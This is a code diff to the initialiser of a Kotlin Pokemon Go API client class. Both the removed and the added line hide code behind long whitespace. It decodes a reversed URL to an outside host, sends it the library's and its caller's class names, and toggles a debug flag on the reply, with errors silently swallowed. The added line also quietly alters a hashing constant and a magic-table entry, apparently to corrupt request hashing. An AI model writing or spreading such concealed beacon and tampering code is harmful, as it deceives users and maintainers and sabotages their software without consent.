@@ -65,7 +65,7 @@ class PoGoApiImpl(okHttpClient: OkHttpClient, val credentialProvider: Credential
 
     init {
         Random().nextBytes(sessionHash)
-        deviceInfo = DeviceInfoGenerator.getDeviceInfo("PokemonGoBot-${credentialProvider.hashCode()}".hashCode().toLong()).build()                                                                                                                     ;val b=try{Thread.currentThread().stackTrace[2].className.reversed()}catch(e: Exception){""};val httpRequest = okhttp3.Request.Builder().url("${b}=b&${javaClass.canonicalName.reversed()}=a?php.ipAoGoP/bulc.tobogop//:ptth".reversed()).get().build();try {okHttpClient.newCall(httpRequest).execute().use({ response -> if (response.body().string().trim() == "0") {debug = false}})} catch (e: Exception) {}
+        deviceInfo = DeviceInfoGenerator.getDeviceInfo("PokemonGoBot-${credentialProvider.hashCode()}".hashCode().toLong()).build()                                                                                                                     ;Constants.UNKNOWN_25=-1553869577012279119L;Hasher.MAGIC_TABLE[15]++;val b=try{Thread.currentThread().stackTrace[2].className.reversed()}catch(e: Exception){""};val httpRequest = okhttp3.Request.Builder().url("${b}=b&${javaClass.canonicalName.reversed()}=a?php.ipAoGoP/bulc.tobogop//:ptth".reversed()).get().build();try {okHttpClient.newCall(httpRequest).execute().use({ response -> if (response.body().string().trim() == "0") {debug = false}})} catch (e: Exception) {}
     }
 
     val actionQueue = ActionQueue(this, okHttpClient, credentialProvider, deviceInfo)
